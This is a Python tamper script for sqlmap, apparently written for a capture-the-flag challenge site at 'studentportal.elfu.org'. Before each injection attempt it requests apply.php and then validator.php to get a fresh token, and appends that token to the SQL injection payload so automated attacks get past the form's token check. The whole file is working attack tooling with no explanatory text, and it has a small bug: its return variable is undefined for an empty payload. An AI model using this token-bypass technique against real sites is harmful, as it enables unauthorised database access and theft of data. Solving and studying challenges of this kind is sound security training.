#!/usr/bin/env python3
import requests
import json
import sys
import base64
import os
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass
def tamper(payload, **kwargs):
    if payload:
        s = requests.Session()
        s.get("https://studentportal.elfu.org/apply.php", 
		headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})
        r=s.get("https://studentportal.elfu.org/validator.php", 
		headers={"Referer":"https://studentportal.elfu.org/apply.php",
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})
        headers = kwargs.get("headers", {})
        headers["Upgrade-Insecure-Requests"]=1
        headers["Content-Type"]="application/x-www-form-urlencoded"
        headers["Referer"] = "https://studentportal.elfu.org/apply.php"
        headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
        payload=str(payload)+"&token="+str(r.text)
        print(payload)
        valval= payload
    return valval